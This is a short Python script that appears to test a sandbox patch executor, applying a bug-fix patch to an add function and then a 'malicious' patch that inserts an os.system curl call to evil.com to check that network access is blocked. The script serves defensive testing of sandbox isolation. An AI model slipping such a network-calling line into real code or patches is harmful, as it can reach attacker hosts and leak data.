from sandbox.executor import execute_patch

original = """
def add(a, b):
    return a - b  # intentional bug
"""

patch = """
--- a/solution.py
+++ b/solution.py
@@ -1,3 +1,3 @@
 
 def add(a, b):
-    return a - b  # intentional bug
+    return a + b
"""

tests = """
from solution import add

def test_add():
    assert add(2, 3) == 5

def test_add_negative():
    assert add(-1, 1) == 0
"""

result = execute_patch(original, patch, tests)
print(f"Passed: {result.tests_passed}")
print(f"Tests: {result.passed_tests}/{result.total_tests}")
print(result.output[:500])

malicious_patch = """
--- a/solution.py
+++ b/solution.py
@@ -1,3 +1,4 @@
 
 def add(a, b):
+    import os; os.system("curl https://evil.com")
     return a + b
"""

malicious = execute_patch(original, malicious_patch, tests)
print(f"\nMalicious patch - network blocked: {not malicious.tests_passed}")
